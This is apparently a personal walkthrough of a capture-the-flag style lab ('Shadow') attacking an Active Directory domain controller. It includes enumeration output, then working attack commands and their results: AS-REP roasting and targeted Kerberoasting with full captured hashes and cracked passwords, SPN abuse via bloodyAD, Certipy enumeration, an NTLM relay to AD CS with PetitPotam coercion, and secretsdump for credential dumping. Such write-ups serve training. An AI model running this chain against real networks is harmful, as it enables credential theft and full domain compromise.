 ====================================( Session Check on 10.1.76.207 )====================================
                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                        
[+] Server 10.1.76.207 allows sessions using username '', password ''                                                                                                                                                                   
                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                        
 =================================( Getting domain SID for 10.1.76.207 )=================================
                                                                                                                                                                                                                                        
do_cmd: Could not initialise lsarpc. Error was NT_STATUS_ACCESS_DENIED                                                                                                                                                                  

[+] Can't determine if host is part of domain or part of a workgroup                                                                                                                                                                    
                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                        
 ===================================( OS information on 10.1.76.207 )===================================
                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                        
[E] Can't get OS info with smbclient                                                                                                                                                                                                    
                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                        
[+] Got OS info for 10.1.76.207 from srvinfo:                                                                                                                                                                                           
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED                                                                                                                                                                  

 ========================================( Users on 10.1.76.207 )========================================
                                                                                                                                                                                                                                        
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain                                                                                            
index: 0xff6 RID: 0x45c acb: 0x00000210 Account: amoss  Name: Angela Moss       Desc: (null)
index: 0xfe9 RID: 0x44f acb: 0x00000210 Account: ATHENA Name: ATHENA    Desc: (null)
index: 0xfef RID: 0x455 acb: 0x00000210 Account: bbrown Name: Bob Brown Desc: (null)
index: 0xff3 RID: 0x459 acb: 0x00000210 Account: clocke Name: Caroline Locke    Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xff5 RID: 0x45b acb: 0x00000210 Account: jbradford      Name: John Bradford     Desc: (null)
index: 0xff2 RID: 0x458 acb: 0x00000210 Account: jsmith Name: John Smith        Desc: (null)
index: 0xff0 RID: 0x456 acb: 0x00010210 Account: jtrueblood     Name: James Trueblood   Desc: (null)
index: 0xf10 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0xfea RID: 0x450 acb: 0x00000210 Account: mbrownlee      Name: Marcel Brownlee   Desc: (null)
index: 0xff4 RID: 0x45a acb: 0x00000210 Account: tclarke        Name: Todd Clarke       Desc: (null)

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[ATHENA] rid:[0x44f]
user:[mbrownlee] rid:[0x450]
user:[bbrown] rid:[0x455]
user:[jtrueblood] rid:[0x456]
user:[jsmith] rid:[0x458]
user:[clocke] rid:[0x459]
user:[tclarke] rid:[0x45a]
user:[jbradford] rid:[0x45b]
user:[amoss] rid:[0x45c]

 ==================================( Share Enumeration on 10.1.76.207 )==================================
                                                                                                                                                                                                                                        
do_connect: Connection to 10.1.76.207 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                                                                                                                                  

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.1.76.207                                                                                                                                                                                             
                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                        
 ============================( Password Policy Information for 10.1.76.207 )============================
                                                                                                                                                                                                                                        
Password:                                                                                                                                                                                                                               

[E] Unexpected error from polenum:                                                                                                                                                                                                      
                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                        

[+] Attaching to 10.1.76.207 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.1.76.207)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SMB SessionError: code: 0xc000000d - STATUS_INVALID_PARAMETER - An invalid parameter was passed to a service or function.

[+] Retieved partial password policy with rpcclient:                                                                                                                                                                                    
                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                        
Minimum Password Length: 8                                                                                                                                                                                                              

 =======================================( Groups on 10.1.76.207 )=======================================
                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                        
[+] Getting builtin groups:                                                                                                                                                                                                             
                                                                                                                                                                                                                                        
group:[Server Operators] rid:[0x225]                                                                                                                                                                                                    
group:[Account Operators] rid:[0x224]
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[Storage Replica Administrators] rid:[0x246]

[+]  Getting builtin group memberships:                                                                                                                                                                                                 
                                                                                                                                                                                                                                        
Group: Incoming Forest Trust Builders' (RID: 557) has member: Could not initialise lsa pipe                                                                                                                                             
Group: Server Operators' (RID: 549) has member: Could not initialise lsa pipe
Group: Remote Desktop Users' (RID: 555) has member: Could not initialise lsa pipe
Group: IIS_IUSRS' (RID: 568) has member: Could not initialise lsa pipe
Group: Distributed COM Users' (RID: 562) has member: Could not initialise lsa pipe
Group: Terminal Server License Servers' (RID: 561) has member: Could not initialise lsa pipe
Group: Storage Replica Administrators' (RID: 582) has member: Could not initialise lsa pipe
Group: Replicator' (RID: 552) has member: Could not initialise lsa pipe
Group: Administrators' (RID: 544) has member: Could not initialise lsa pipe
Group: Users' (RID: 545) has member: Could not initialise lsa pipe
Group: RDS Endpoint Servers' (RID: 576) has member: Could not initialise lsa pipe
Group: Event Log Readers' (RID: 573) has member: Could not initialise lsa pipe
Group: RDS Management Servers' (RID: 577) has member: Could not initialise lsa pipe
Group: Windows Authorization Access Group' (RID: 560) has member: Could not initialise lsa pipe
Group: Certificate Service DCOM Access' (RID: 574) has member: Could not initialise lsa pipe
Group: Account Operators' (RID: 548) has member: Could not initialise lsa pipe
Group: Remote Management Users' (RID: 580) has member: Could not initialise lsa pipe
Group: Guests' (RID: 546) has member: Could not initialise lsa pipe
Group: Hyper-V Administrators' (RID: 578) has member: Could not initialise lsa pipe
Group: Print Operators' (RID: 550) has member: Could not initialise lsa pipe
Group: Performance Log Users' (RID: 559) has member: Could not initialise lsa pipe
Group: Network Configuration Operators' (RID: 556) has member: Could not initialise lsa pipe
Group: Backup Operators' (RID: 551) has member: Could not initialise lsa pipe
Group: RDS Remote Access Servers' (RID: 575) has member: Could not initialise lsa pipe
Group: Cryptographic Operators' (RID: 569) has member: Could not initialise lsa pipe
Group: Pre-Windows 2000 Compatible Access' (RID: 554) has member: Could not initialise lsa pipe
Group: Performance Monitor Users' (RID: 558) has member: Could not initialise lsa pipe
Group: Access Control Assistance Operators' (RID: 579) has member: Could not initialise lsa pipe

[+]  Getting local groups:                                                                                                                                                                                                              
                                                                                                                                                                                                                                        
group:[Cert Publishers] rid:[0x205]                                                                                                                                                                                                     
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]

[+]  Getting local group memberships:                                                                                                                                                                                                   
                                                                                                                                                                                                                                        
Group: Denied RODC Password Replication Group' (RID: 572) has member: Could not initialise lsa pipe                                                                                                                                     
Group: RAS and IAS Servers' (RID: 553) has member: Could not initialise lsa pipe
Group: DnsAdmins' (RID: 1101) has member: Could not initialise lsa pipe
Group: Cert Publishers' (RID: 517) has member: Could not initialise lsa pipe
Group: Allowed RODC Password Replication Group' (RID: 571) has member: Could not initialise lsa pipe

[+]  Getting domain groups:                                                                                                                                                                                                             
                                                                                                                                                                                                                                        
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]                                                                                                                                                                             
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[ADCS-Reader] rid:[0x641]

[+]  Getting domain group memberships:                                                                                                                                                                                                  
                                                                                                                                                                                                                                        
Group: 'Cloneable Domain Controllers' (RID: 522) has member: Could not initialise lsa pipe                                                                                                                                              
Group: 'Domain Computers' (RID: 515) has member: Could not initialise lsa pipe
Group: 'Read-only Domain Controllers' (RID: 521) has member: Could not initialise lsa pipe
Group: 'DnsUpdateProxy' (RID: 1102) has member: Could not initialise lsa pipe
Group: 'Domain Guests' (RID: 514) has member: Could not initialise lsa pipe
Group: 'Domain Controllers' (RID: 516) has member: Could not initialise lsa pipe
Group: 'Key Admins' (RID: 526) has member: Could not initialise lsa pipe
Group: 'ADCS-Reader' (RID: 1601) has member: Could not initialise lsa pipe
Group: 'Schema Admins' (RID: 518) has member: Could not initialise lsa pipe
Group: 'Protected Users' (RID: 525) has member: Could not initialise lsa pipe
Group: 'Enterprise Read-only Domain Controllers' (RID: 498) has member: Could not initialise lsa pipe
Group: 'Domain Users' (RID: 513) has member: Could not initialise lsa pipe
Group: 'Enterprise Admins' (RID: 519) has member: Could not initialise lsa pipe
Group: 'Group Policy Creator Owners' (RID: 520) has member: Could not initialise lsa pipe
Group: 'Domain Admins' (RID: 512) has member: Could not initialise lsa pipe
Group: 'Enterprise Key Admins' (RID: 527) has member: Could not initialise lsa pipe

 ===================( Users on 10.1.76.207 via RID cycling (RIDS: 500-550,1000-1050) )===================
                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                        
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.                                                                                                                                                               
                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                        
 ================================( Getting printer info for 10.1.76.207 )================================
                                                                                                                                                                                                                                        
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED                                                                                                                                                                 

enum4linux complete on Thu May  7 11:33:24 2026

                                                                                                                                                                                                                                        
┌──(root㉿kali)-[~/Desktop/Hack Smarter Labs/Shadow]
└─# ion Group' (RID: 572) has member: Could not initialise lsa pipe                                                                                                                                     
quote> Group: RAS and IAS Servers' (RID: 553) has member: Could not initialise lsa pipe
Command 'ion' not found, did you mean:
  command 'idn' from deb idn
  command 'icon' from deb icont
  command 'iog' from deb iog
  command 'mon' from deb mon
  command 'pon' from deb ppp
Try: apt install <deb name>
                                                                                                                                                                                                                                        
┌──(root㉿kali)-[~/Desktop/Hack Smarter Labs/Shadow]
└─# Group: DnsAdmins' (RID: 1101) has member: Could not initialise lsa pipe
quote> Group: Cert Publishers' (RID: 517) has member: Could not initialise lsa pipe
Group:: command not found
                                                                                                                                                                                                                                        
┌──(root㉿kali)-[~/Desktop/Hack Smarter Labs/Shadow]
└─# Group: Allowed RODC Password Replication Group' (RID: 571) has member: Could not initialise lsa pipe
quote> 
quote> [+]  Getting domain groups:                                                                                                                                                                                                             
quote>                                                                                                                                                                                                                                         
quote> group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]                                                                                                                                                                             
quote> group:[Domain Admins] rid:[0x200]
quote> group:[Domain Users] rid:[0x201]
quote> group:[Domain Guests] rid:[0x202]
quote> group:[Domain Computers] rid:[0x203]
quote> group:[Domain Controllers] rid:[0x204]
quote> group:[Schema Admins] rid:[0x206]
quote> group:[Enterprise Admins] rid:[0x207]
quote> group:[Group Policy Creator Owners] rid:[0x208]
quote> group:[Read-only Domain Controllers] rid:[0x209]
quote> group:[Cloneable Domain Controllers] rid:[0x20a]
quote> group:[Protected Users] rid:[0x20d]
quote> group:[Key Admins] rid:[0x20e]
quote> group:[Enterprise Key Admins] rid:[0x20f]
quote> group:[DnsUpdateProxy] rid:[0x44e]
quote> group:[ADCS-Reader] rid:[0x641]
quote> 
quote> [+]  Getting domain group memberships:                                                                                                                                                                                                  
quote>                                                                                                                                                                                                                                         
quote> Group: 'Cloneable Domain Controllers' (RID: 522) has member: Could not initialise lsa pipe                                                                                                                                              
quote> Group: 'Domain Computers' (RID: 515) has member: Could not initialise lsa pipe
quote> Group: 'Read-only Domain Controllers' (RID: 521) has member: Could not initialise lsa pipe
quote> Group: 'DnsUpdateProxy' (RID: 1102) has member: Could not initialise lsa pipe
quote> Group: 'Domain Guests' (RID: 514) has member: Could not initialise lsa pipe
quote> Group: 'Domain Controllers' (RID: 516) has member: Could not initialise lsa pipe
quote> Group: 'Key Admins' (RID: 526) has member: Could not initialise lsa pipe
quote> Group: 'ADCS-Reader' (RID: 1601) has member: Could not initialise lsa pipe
quote> Group: 'Schema Admins' (RID: 518) has member: Could not initialise lsa pipe
quote> Group: 'Protected Users' (RID: 525) has member: Could not initialise lsa pipe
quote> Group: 'Enterprise Read-only Domain Controllers' (RID: 498) has member: Could not initialise lsa pipe
quote> Group: 'Domain Users' (RID: 513) has member: Could not initialise lsa pipe
quote> Group: 'Enterprise Admins' (RID: 519) has member: Could not initialise lsa pipe
quote> Group: 'Group Policy Creator Owners' (RID: 520) has member: Could not initialise lsa pipe
quote> Group: 'Domain Admins' (RID: 512) has member: Could not initialise lsa pipe
quote> Group: 'Enterprise Key Admins' (RID: 527) has member: Could not initialise lsa pipe
quote> 
quote>  ===================( Users on 10.1.76.207 via RID cycling (RIDS: 500-550,1000-1050) )===================
quote>                                                                                                                                                                                                                                         
quote>                                                                                                                                                                                                                                         
quote> [E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.                                                                                                                                                               
Group:: command not found
```

I checked for a second time to verify if these users were valid with rpcclient as well as with netexec as seen bleow.

ShadowGate Users

user:Administrator: user:Guest: user:krbtgt:

user:ATHENA: user:mbrownlee: user:bbrown: user:jtrueblood:blood\_brothers user:jsmith: user:clocke: user:tclarke: user:jbradford: user:amoss:

![image.png](attachment:eb2277b1-415a-4c0d-9810-b5f0e94329e9:image.png)

AS-REP

kerbrute username —domain shadow.gate usernames —dc ip addr —downgrade (try next time)

or use:

nxc smb ip addr -u ‘’ p ‘’ — users- export users.txt

![image.png](attachment:d0d8f3a3-86f7-44f2-97a2-0f92c9722d55:image.png)

nxc ldap

nxc ldap 10.1.76.207 -u ShadowGateUsers.txt -p ‘’ —asreproast ShadowAsreproastables

Confirming these users, we can save them as an ASREProastable users as a text file:

```jsx
┌──(root㉿kali)-[~/Desktop/Hack Smarter Labs/Shadow]
└─# nxc ldap 10.1.76.207 -u ShadowGateUsers.txt -p '' --asreproast ShadowAseproastables.txt
zsh: /root/.local/bin/nxc: bad interpreter: /home/kali/.local/share/pipx/venvs/netexec/bin/python: no such file or directory
[*] Initializing LDAP protocol database
LDAP        10.1.76.207     389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:shadow.gate) (signing:None) (channel binding:Never) 
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
LDAP        10.1.76.207     389    DC01             $krb5asrep$23$jtrueblood@SHADOW.GATE:5add128603545e7ad4007d1b81558543$1064e081f21a74e566628865da45b92ff1635d4e68682b98ca2efc21d12f3d0c8e687138c6f1d25c6c8394d22358cacb21b3b72f5b10f2e7cf943b881d6ad04ef6bab1b867bdb160186477768e7d3e88e73ff1bed848587be9ff04966147df77e8b2be9d2d191bc69547edaf080e3f4cf90c077ff949548d917834905da240eac1028d70c94a3fadf6bdaadc45f9e90a7ac0f55fd4f131e53b2ab95673fdc33ad1de5ec10c78c85ed8d9c900d8bb6b375879b8fc32bf3d90350e21179e36ad711f5b6e8f37f77b1e5e8a4b37eb40c46a253ce61aec7105a0362f5f3df66c442a22dc5505072b34ef2762
```

I ran the hash of the user jtrueblood and my Hashcat crashed! I already wrote down the password, so it will make things a little bit easier.

found: user jtrueblood hash:

$krb5asrep$23$jtrueblood@SHADOW.GATE:5add128603545e7ad4007d1b81558543$1064e081f21a74e566628865da45b92ff1635d4e68682b98ca2efc21d12f3d0c8e687138c6f1d25c6c8394d22358cacb21b3b72f5b10f2e7cf943b881d6ad04ef6bab1b867bdb160186477768e7d3e88e73ff1bed848587be9ff04966147df77e8b2be9d2d191bc69547edaf080e3f4cf90c077ff949548d917834905da240eac1028d70c94a3fadf6bdaadc45f9e90a7ac0f55fd4f131e53b2ab95673fdc33ad1de5ec10c78c85ed8d9c900d8bb6b375879b8fc32bf3d90350e21179e36ad711f5b6e8f37f77b1e5e8a4b37eb40c46a253ce61aec7105a0362f5f3df66c442a22dc5505072b34ef2762:blood\_brothers

Use Hashcat to crack the hash

Tomorrow: try Data collection and Path:

bloodhound data collection:

bloodhound-python -user —pass -ns (ip) -c ALL -d shadow.gate —zip

Generic Write according to bloodhound and bloodyAD

![image.png](attachment:18f5ed23-0961-427c-94e8-9efa80f7f85a:image.png)

we find that bob brown also has write permissions.

we can change his SPN with BloodyAD: bloodyAD —host -d shadow.gate -u ‘jtrueblood’ ‘p ‘blood\_brothers’ set object bbrown servicePrincipalName -v ‘fake/spn.shadow.gate’

![image.png](attachment:2730d1e0-082a-4b6d-929b-142f1a7decef:image.png)

```jsx
                                                                                                                    
┌──(root㉿kali)-[/opt/bloodyAD]
└─# nxc ldap 10.1.49.86 -u 'jtrueblood' -p 'blood_brothers' --kerberoast kerberoastables.txt                                                       
LDAP        10.1.49.86      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:shadow.gate) (signing:None) (channel binding:Never) 
LDAP        10.1.49.86      389    DC01             [+] shadow.gate\\jtrueblood:blood_brothers 
LDAP        10.1.49.86      389    DC01             [*] Skipping disabled account: krbtgt
LDAP        10.1.49.86      389    DC01             [*] Total of records returned 1
LDAP        10.1.49.86      389    DC01             [*] sAMAccountName: bbrown, memberOf: CN=ADCS-Reader,CN=Users,DC=shadow,DC=gate, pwdLastSet: 2026-01-15 09:24:07.120150, lastLogon: <never>
LDAP        10.1.49.86      389    DC01             $krb5tgs$23$*bbrown$SHADOW.GATE$shadow.gate\\bbrown*$ee00ed65c202a47f286ed5bbc8369b11$954ae7ca774ad7aca7b5a1c29c5c3256c9dc62de61965c5158b31e1e5ed719f3533a1be4b3983e2fd81db3ef82b0efce1d61a9b56b4a26ae141328d00fea7e33c68175907118cd8cc5dd56ff8d4fbfdcc1feeb7ad24d64c089d192b34ba987d2cffe03584e7e5b08211bebdd93c662b05bec85692c818f26f6500f950467f6b35d25f632548df10073d78004029e296d7508cb92745af6384506732952dd2cf359a4c1b813b70935f77f35d5c0a3af6b93b9df392ebdfb8504317b75bd8e57f535fe087717aa937afa7c55e161b1386ed619147d405f4d1fc4e3ff5339bf52264c2202a1369f2bb4dfcceb08e8de393f18adaa8366f90e8e5d8258cb5504ab642579d41336a8f47bb0945302e2a4c67a20a348caa54dbeda3a9a3b325fdaba0198f652405c0fb0eceeeed1519b418590f2e8294bfe822b75573e17f657fc71782220c101fb8ce826428771cfc0938974375e1cdcc1a71a6396a7993d32838a199047922399b5c3dbfcae6dd0c051ccd09ea4a9e29aeb2723c1af46647dc1ac83b9bbc32d3b7b7d5ecf22a9fb41e1a458cc9a25aa54f55fb178c1a29fa3c1d80cb220c034042f8989ed54d979c1b4b5ee4ee765443e4c3f005a79c0f2bdd1b8359d1ae8cc830ad0171c64ba6e5ea1c8ca391efb3cca4b8e37680779d346f123ca6682432d0eda90815cc27ddccd6ce95b95c2555b234f8255dcb32bb579cc9092dcbb7c0137eb4cbaf4456e042270f33f73aea4699c10c768fbaeebddbc7f82a32cb4710c0fa191c19c40336acbd51f8fac283a447673d8bc75f81210801b843e7713f423a56eb3700890cf5ffa7df238c8e1b2e9bc02722f2d45532f06013ef0b8001883e9e41a240b6721b9d69617a88e50c9b9b2c65e6a13f6ff4245da9b0447c1232cefb2bc5b732103de587c358f643689a46f6cee1a0ab27447000d1bb355a73d06301ec96c53cdb9f4c2defc494e43d5076e2d4e8a67752d6d8e94d74a6e6063a4d43f08b86a314d51f60a11b741df8f2801c32ac99304da3d2cda05aebe4a5c6911430f367e45afe418fccc1b45faac0f1b54a42bfd0a0b4ad4f123140797819f66ecee88837815547fc743e9cef813c895e00c61be63317d6b6d3ee6a545601406f8ca3e59083d8ddb4703d3bbefbdfeb0fc4cef9a15190fe6174b3857dbcca99100b3b154f4254d275cfce82f56a5fa81da28159d04ae942cce9f2a56bb3c1c4da5ef6749d794a675c50d45ee4eec7ddcd005c3004e08e0e9df91ae2106d9bb53b6659a0d72b2377d9b223d234ade0a7cee127b4eee014aa3bd4b5be5f32fbc1d48fb0743ed41e9ed093dde72ba4df5506e52b2d2746c8d13a3f98a1f4ebef747512f348e3eb97c8c90d399a6e4e1aa2b401ebd0ffb9d2ad02cf7e4606cc3b52dd19f7ba7e0482f84d8eeb55c6aeb16a3df8305f0307be48ab7388e2d8f8779f2d2bf2e6a3469be1818ab8980fde981c01ebb60c58efc1bd080e3f580f201daa757e722ae20043cf7ad3af6308ab3739722
```

![image.png](attachment:39e991d6-ab6c-421b-b913-981dcb35829f:image.png)

Ceritpy

bbrown:12345678 We can also look for shares with nxc

![image.png](attachment:83bf5260-be1f-4890-b535-66b867021607:image.png)

![image.png](attachment:26fe8dff-fc58-493d-b262-75cb4c96b7e0:image.png)

He has writable shares!

certipy-ad find -u bobbrown@shadow.gate -p ‘12345678’ -dc-ip 10.1.49.86

```jsx
 ┌──(root㉿kali)-[~/Desktop/Hack Smarter Labs/Shadow]
└─# certipy-ad find -u bbrown@shadow.gate -p 12345678 -dc-ip 10.1.49.86 
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'shadow-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'shadow-DC01-CA'
[*] Checking web enrollment for CA 'shadow-DC01-CA' @ 'DC01.shadow.gate'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20260508142215_Certipy.txt'
[*] Wrote text output to '20260508142215_Certipy.txt'
[*] Saving JSON output to '20260508142215_Certipy.json'
[*] Wrote JSON output to '20260508142215_Certipy.json'

```

Impacket-secretsdump shadow.gate/’dc’ -hashes:\<hash goes here>

[ntlmrelayx.py](http://ntlmrelayx.py/) -t [http://dc01.shadow.gate/certsrv/certfnsh.asp](http://dc01.shadow.gate/certsrv/certfnsh.asp) --adcs --template DomainController -smb2support

nxc smb dc01.shadow.gate -u 'bbrown' -p '12345678' -M coerce\_plus -o LISTENER=10.200.29.232 METHOD=Petitpotam

maybe can use [penelope.py](http://penelope.py) here?





\---------------------------------FINISH MACHINE LATER-------------------------------------------

&#x20;

DC01 Privilege Escalation

`certipy-ad auth -pfx DC01.shadow.gate.pfx -dc-ip 10.1.4.86`

![image.png](attachment:067f94ee-f248-43c1-9b6d-1214f58b58e0:image.png)

`secretsdump.py 'shadow.gate'/'DC01$'@DC01.SHADOW.GATE -hashes : insert here`



